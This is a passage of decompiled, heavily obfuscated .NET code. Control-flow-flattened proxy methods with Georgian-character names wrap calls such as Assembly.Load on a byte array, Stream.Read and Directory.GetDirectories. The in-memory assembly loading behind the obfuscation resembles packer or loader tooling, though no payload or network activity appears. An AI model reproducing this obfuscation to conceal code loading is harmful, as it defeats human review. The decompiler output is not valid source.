                    break;
                  default:
                    num2 = 0;
                    break;
                }
                num1 = num2;
                continue;
            }
          }
label_7:
          obj0.SetData(obj1, obj2);
        }

        internal static string ႠႷ([In] Assembly obj0, [In] int obj1, [In] int obj2)
        {
label_3:
          int num1;
          switch (obj2 ^ obj1)
          {
            case 95:
              num1 = 3;
              break;
            default:
              num1 = 4;
              break;
          }
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 1:
                goto label_3;
              case 2:
              case 4:
                num2 = 1;
                continue;
              case 3:
              case 5:
                goto label_8;
              case 7:
                num2 = 1;
                continue;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.ႰႥ.ႰႭ.ႠႷ);
                num2 = 1;
                continue;
            }
          }
label_8:
          return obj0.Location;
        }

        internal static int ႠႨ([In] Stream obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3, [In] int obj4, [In] int obj5)
        {
label_3:
          int num1;
          switch (obj5 ^ obj4)
          {
            case 1:
              num1 = 2;
              break;
            default:
              num1 = 3;
              break;
          }
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 0:
                goto label_3;
              case 2:
                goto label_8;
              case 3:
                num2 = 0;
                continue;
              case 7:
                num2 = 0;
                continue;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.ႰႥ.ႰႭ.ႠႨ);
                num2 = 0;
                continue;
            }
          }
label_8:
          return obj0.Read(obj1, obj2, obj3);
        }

        internal static void ႠႳ([In] Thread obj0, [In] ApartmentState obj1, [In] int obj2, [In] int obj3)
        {
          int num1 = 2;
          while (true)
          {
            switch (num1)
            {
              case 3:
                num1 = 2;
                continue;
              case 4:
                goto label_7;
              case 5:
                goto label_8;
              default:
                int num2;
                switch (obj3 ^ obj2)
                {
                  case 23:
                    num2 = 4;
                    break;
                  default:
                    num2 = 3;
                    break;
                }
                num1 = num2;
                continue;
            }
          }
label_8:
          return;
label_7:
          obj0.SetApartmentState(obj1);
        }

        internal static Assembly ႠႤ([In] byte[] obj0, [In] int obj1, [In] int obj2)
        {
label_3:
          int num1;
          switch (obj2 ^ obj1)
          {
            case 74:
              num1 = 6;
              break;
            default:
              num1 = 2;
              break;
          }
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 6:
                goto label_8;
              case 1:
              case 4:
                num2 = 3;
                continue;
              case 2:
                num2 = 3;
                continue;
              case 3:
              case 5:
                goto label_3;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.ႰႥ.ႰႭ.ႠႤ);
                num2 = 3;
                continue;
            }
          }
label_8:
          return Assembly.Load(obj0);
        }

        internal static Exception ႠႼ([In] int obj0, [In] int obj1, [In] int obj2)
        {
label_3:
          int num1;
          switch (obj2 ^ obj1)
          {
            case 17:
              num1 = 2;
              break;
            default:
              num1 = 0;
              break;
          }
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 0:
                num2 = 7;
                continue;
              case 2:
              case 4:
                goto label_8;
              case 3:
              case 7:
                goto label_3;
              case 6:
                num2 = 7;
                continue;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.ႰႥ.ႰႭ.ႠႼ);
                num2 = 7;
                continue;
            }
          }
label_8:
          return ProjectData.CreateProjectError(obj0);
        }

        internal static string[] ႭႣ([In] string obj0, [In] int obj1, [In] int obj2)
        {
label_3:
          int num1;
          switch (obj2 ^ obj1)
          {
            case 82:
              num1 = 4;
              break;
            default:
              num1 = 2;
              break;
          }
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 0:
                num2 = 1;
                continue;
              case 1:
              case 3:
                goto label_3;
              case 2:
                num2 = 1;
                continue;
              case 4:
              case 5:
              case 6:
                goto label_8;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.ႰႥ.ႰႭ.ႭႣ);
                num2 = 1;
                continue;
            }
          }
label_8:
          return Directory.GetDirectories(obj0);
        }

        [StructLayout(LayoutKind.Explicit, Size = 86, Pack = 1)]
        private struct Ⴐ
        {
        }
      }
    }
  }
}
